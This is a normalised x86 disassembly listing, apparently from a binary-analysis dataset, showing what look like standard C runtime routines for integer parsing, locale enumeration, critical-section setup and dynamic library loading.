and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov esi 0x7fffffff
xor eax eax
mov esi 0x80000000
jmp r-xdata
or ecx 0x4
mov [ ebp - 0x8 ] ecx
jmp r-xdata
cmp esi [ ebp - 0x1c ]
jne r-xdata
mov cl [ edi ]
inc edi
mov [ ebp - 0xc ] cl
mov [ ebp + 0xc ] edi
jmp r-xdata
cmp ebx [ ebp - 0x20 ]
jb r-xdata
ja r-xdata
cmp edx [ ebp - 0x24 ]
jbe r-xdata
sub_42e159
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
lea ecx [ ebp + 0xc ]
push ebx
push esi
push edi
call sub_42eb6d
test al al
je r-xdata
xor eax eax
mov edi eax
mov ebx eax
mov ebx [ ebp + 0x14 ]
push 0x2
pop edi
test ebx ebx
je r-xdata
mov eax edi
mov edx ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ esi ] ecx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
call sub_41cbf0
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
movzx esi [ eax ]
add eax edi
push 0x8
push esi
mov [ ebp + 0xc ] eax
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp ebx 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
xor eax eax
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x4 ] eax
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
movzx esi [ ecx ]
add ecx edi
mov [ ebp + 0xc ] ecx
jmp r-xdata
cmp si dx
jb r-xdata
cmp ebx 0x10
jne r-xdata
push 0x30
pop edx
test ebx ebx
je r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
mov eax ebx
cdq
mov ecx edx
mov [ ebp - 0x24 ] eax
push ecx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] ecx
call sub_448b80
mov [ ebp - 0x1c ] ecx
mov ecx edx
mov [ ebp - 0x18 ] ebx
xor ebx ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ecx
push 0x19
lea eax [ esi - 0x61 ]
pop edx
cmp ax dx
jbe r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov edx 0xff10
cmp si dx
jae r-xdata
movzx eax si
sub eax edx
jmp r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop edx
cmp si dx
jae r-xdata
lea eax [ esi - 0x61 ]
cmp ax dx
movzx eax si
ja r-xdata
or eax 0xffffffff
push 0x19
pop edx
mov eax 0xff1a
cmp si ax
jb r-xdata
mov edx 0x660
cmp si dx
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x19
lea eax [ esi - 0x61 ]
pop edx
cmp ax dx
jbe r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx edi si
sub edi eax
jmp r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
movzx eax [ ecx ]
add ecx edi
mov [ ebp + 0xc ] ecx
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
or eax 0xffffffff
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
test eax eax
je r-xdata
lea eax [ esi - 0x61 ]
movzx edi si
cmp ax dx
ja r-xdata
or edi 0xffffffff
push 0x19
pop edx
mov edx 0xff1a
cmp si dx
jb r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp edi 0xffffffff
jne r-xdata
test ebx ebx
jne r-xdata
cmp eax 0x58
je r-xdata
push 0xa
pop ebx
mov [ ebp + 0x14 ] ebx
jmp r-xdata
mov edx 0x6f0
cmp si dx
jb r-xdata
add edi 0xffffffc9
jmp r-xdata
sub edi 0x20
push esi
lea ecx [ ebp + 0xc ]
call sub_42eb26
mov eax [ ebp - 0x4 ]
test al 0x8
jne r-xdata
cmp edi [ ebp + 0x14 ]
jae r-xdata
or edi 0xffffffff
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
cmp edi 0xffffffff
je r-xdata
movzx esi [ ecx ]
add ecx edi
mov [ ebp + 0xc ] ecx
push 0x10
pop ebx
mov [ ebp + 0x14 ] ebx
test ebx ebx
jne r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x8 ]
push ebx
push edi
push eax
call sub_42d52d
add esp 0xc
test al al
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
or edx 0x8
cmp eax ecx
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jb r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
push eax
lea ecx [ ebp + 0xc ]
call sub_42eb26
jmp r-xdata
push 0x8
pop ebx
mov [ ebp + 0x14 ] ebx
mov edx 0x966
cmp si dx
jb r-xdata
test [ ebp - 0x4 ] 0x2
je r-xdata
call sub_430f56
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
jne r-xdata
mov edi eax
jmp r-xdata
push eax
push ecx
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_448d60
mov ecx eax
mov eax edx
add ecx edi
mov [ ebp - 0x8 ] ecx
adc eax ebx
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x10 ]
ja r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
neg edi
adc ebx 0x0
neg ebx
test al 0x2
je r-xdata
or edi 0xffffffff
or ebx 0xffffffff
jmp r-xdata
push 0x30
pop eax
cmp si ax
jb r-xdata
cmp ecx esi
jne r-xdata
cmp ecx esi
jb r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x38 ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov ebx 0x7fffffff
xor eax eax
mov ebx 0x80000000
jmp r-xdata
or edx 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax [ ebp - 0x14 ]
jne r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
movzx esi [ eax ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jb r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
ja r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
cmp edi [ ebp - 0x1c ]
jbe r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
mov edx 0xc66
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
mov edx 0xe50
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
lea eax [ edx + 0x76 ]
cmp si ax
jb r-xdata
add edx 0x50
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
add eax 0x50
cmp si ax
jb r-xdata
add eax 0x50
cmp si ax
jb r-xdata
mov edx 0x1040
cmp si dx
jb r-xdata
add edx 0x50
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
mov edx 0x17e0
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp si ax
jb r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
add edx 0x30
cmp si dx
jb r-xdata
lea edx [ eax + 0xa ]
cmp si dx
jb r-xdata
add eax 0x30
cmp si ax
jae r-xdata
add eax 0x30
cmp si ax
jb r-xdata
jmp r-xdata
add edx 0x30
cmp si dx
jae r-xdata
jmp r-xdata
sub_42e74e
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e77b
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e7a8
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push [ ebp + 0x14 ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e7d5
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push [ ebp + 0x14 ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e802
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x8
mov [ eax ] edx
sub_42e81e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x8
mov [ eax ] edx
sub_42e865
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
movzx eax [ ebp + 0x8 ]
push 0x8
push eax
call sub_42ee35
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_42e884
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_43d25c
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
pop ebp
retn
sub_42e8ba
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x30 ]
cmp al 0x9
ja r-xdata
lea eax [ ecx - 0x61 ]
cmp al 0x19
ja r-xdata
movsx eax cl
sub eax 0x30
pop ebp
retn
lea eax [ ecx - 0x41 ]
cmp al 0x19
ja r-xdata
movsx eax cl
sub eax 0x57
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
movsx eax cl
sub eax 0x37
pop ebp
retn
sub_42e8f4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x30
pop edx
cmp cx dx
jb r-xdata
push 0x41
pop eax
push 0x19
pop edx
cmp ax cx
ja r-xdata
cmp cx 0x3a
jae r-xdata
lea eax [ ecx - 0x61 ]
cmp ax dx
ja r-xdata
cmp cx 0x5a
jbe r-xdata
mov edx 0xff10
cmp cx dx
jae r-xdata
movzx eax cx
sub eax edx
jmp r-xdata
or eax 0xffffffff
lea eax [ ecx - 0x61 ]
cmp ax dx
movzx eax cx
ja r-xdata
mov eax 0xff1a
cmp cx ax
jb r-xdata
mov edx 0x660
cmp cx dx
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
add eax 0xffffffc9
pop ebp
retn
sub eax 0x20
or eax 0xffffffff
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
pop ebp
retn
mov edx 0x6f0
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x966
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0xc66
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0xe50
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ eax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
add edx 0x50
cmp cx dx
jb r-xdata
add eax 0x50
cmp cx ax
jb r-xdata
mov edx 0x1040
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x17e0
cmp cx dx
jb r-xdata
lea eax [ edx + 0xa ]
cmp cx ax
jb r-xdata
add edx 0x30
cmp cx dx
jb r-xdata
add eax 0x30
cmp cx ax
jae r-xdata
jmp r-xdata
sub_42eafe
mov edi edi
push ebp
mov ebp esp
dec [ ecx ]
mov al [ ebp + 0x8 ]
mov ecx [ ecx ]
test al al
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] al
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
sub_42eb26
mov edi edi
push ebp
mov ebp esp
add [ ecx ] 0xfffffffe
mov ax [ ebp + 0x8 ]
mov ecx [ ecx ]
test ax ax
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] ax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
sub_42eb88
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_42ed35
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ed5f
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push [ ebp + 0xc ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ed8a
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push [ ebp + 0xc ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42edb5
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push [ ebp + 0xc ]
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ede0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push [ ebp + 0xc ]
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ee0b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_4390f9
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and eax [ ebp + 0xc ]
pop ebp
retn
sub_42ee35
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42ee0b
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d2ec
jmp r-xdata
add esp 0xc
pop ebp
retn
sub_42ee68
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push 0x0
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ee92
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42eebc
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push [ ebp + 0xc ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42eee7
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push [ ebp + 0xc ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ef12
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push 0x0
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ef3c
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push [ ebp + 0xc ]
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ef67
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42ef91
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d58b
add esp 0xc
push [ ebp + 0xc ]
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42efbc
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push 0x0
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42efe6
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push 0x0
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f010
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
push ecx
push ecx
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d570
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f03a
mov edi edi
push esi
push edi
mov edi rw-data
xor esi esi
push 0x0
call sub_42f092
pop ecx
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x138
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_42fd88
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_42f092
mov edi edi
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_42f0ec
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
push 0x0
push 0x0
push [ ebp + 0x8 ]
ror esi cl
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42f14a
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_42f20c
pop ecx
mov [ rw-data ] eax
push 0x1
push sub_42f0ec
call [ EnumSystemLocalesW@IAT ]
mov esi eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f1c2
mov eax esi
call sub_40d2b6
retn 0xc
sub_42f1ce
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42f14a
mov esp ebp
pop ebp
retn
sub_42f20c
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_42f26e
mov eax [ ecx ]
push [ eax ]
call sub_42f20c
pop ecx
push 0x1
push sub_42f0ec
mov [ rw-data ] eax
call [ EnumSystemLocalesW@IAT ]
mov edx [ rw-data ]
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor edx edx
ror edx cl
xor edx [ rw-data ]
mov [ rw-data ] edx
retn
sub_42f2b2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42f20c
pop ecx
push 0x1
push sub_42f0ec
mov [ rw-data ] eax
call [ EnumSystemLocalesW@IAT ]
mov edx [ rw-data ]
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor edx edx
ror edx cl
xor edx [ rw-data ]
mov [ rw-data ] edx
pop ebp
retn
sub_42f636
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
push [ esi ]
call sub_42f6f6
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
add esi 0x4
sub_42f65a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_42f6f6
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_40ff1e
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_42f6f6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
lea edi [ eax * 4 + rw-data ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
push ebx
mov ebx [ eax * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
pop ebx
sub_42f771
mov edi edi
